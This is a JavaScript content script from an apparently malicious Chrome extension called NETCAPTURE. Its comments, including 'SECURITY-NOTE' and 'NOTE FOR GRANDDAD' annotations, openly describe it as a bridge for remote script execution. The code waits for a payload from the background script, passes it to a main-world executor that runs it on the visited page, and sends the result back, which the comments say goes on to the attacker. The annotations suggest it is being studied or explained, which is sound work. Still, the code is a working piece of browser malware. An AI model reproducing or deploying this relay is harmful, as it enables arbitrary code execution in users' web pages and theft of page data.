// dynamic_script_runner.js - Content script that acts as the bridge for Remote Script Execution (RSE).

// SECURITY-NOTE: This script's purpose is to act as a secure bridge. The background
// script can't directly execute code in the context of the webpage. This script
// receives the malicious payload from the background script and forwards it to
// `main_world_executor.js`, which has the necessary privileges to run it.

const POST_MESSAGE_OUT_ID = 'NETCAPTURE_EXECUTE_PAYLOAD';
const POST_MESSAGE_IN_ID = 'NETCAPTURE_EXECUTION_RESULT';


// --- CONTENT SCRIPT COMMUNICATION LOGIC (Listens to Service Worker, forwards to Main World) ---
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    // DANGER: This listener waits for the 'EXECUTE_PAYLOAD' command from the
    // background script, which contains the malicious code to be run.
    // NOTE FOR GRANDDAD: This script acts like a secret messenger. It's always
    // listening for a message from the "brain" (background.js) that contains
    // a malicious command.
    if (request.type === 'EXECUTE_PAYLOAD' && request.payload) {
        
        const resultListener = (event) => {
            // Security check: must check type and source
            if (event.source !== window || !event.data || event.data.type !== POST_MESSAGE_IN_ID) {
                return;
            }

            // Clean up the listener immediately
            window.removeEventListener('message', resultListener);
            
            // SECURITY-NOTE: After the script is executed, its result is captured
            // and sent back to the background script, which then forwards it to the attacker.
            const resultData = event.data.detail;
            if (resultData.error) {
                sendResponse({ result: null, error: resultData.error });
            } else {
                sendResponse({ result: resultData.result, error: null });
            }
        };

        window.addEventListener('message', resultListener, false);

        // Send the script payload from the Content Script's isolated world to the Main World Listener
        // NOTE FOR GRANDDAD: Once it receives a command, it passes that command along
        // to another helper script that has the power to run it on the webpage.
        window.postMessage({
            type: POST_MESSAGE_OUT_ID,
            payload: request.payload,
        }, '*');

        // This is crucial. It tells Chrome to keep the message channel open because we will
        // send a response asynchronously (after the Main World script replies).
        return true; 
    }
});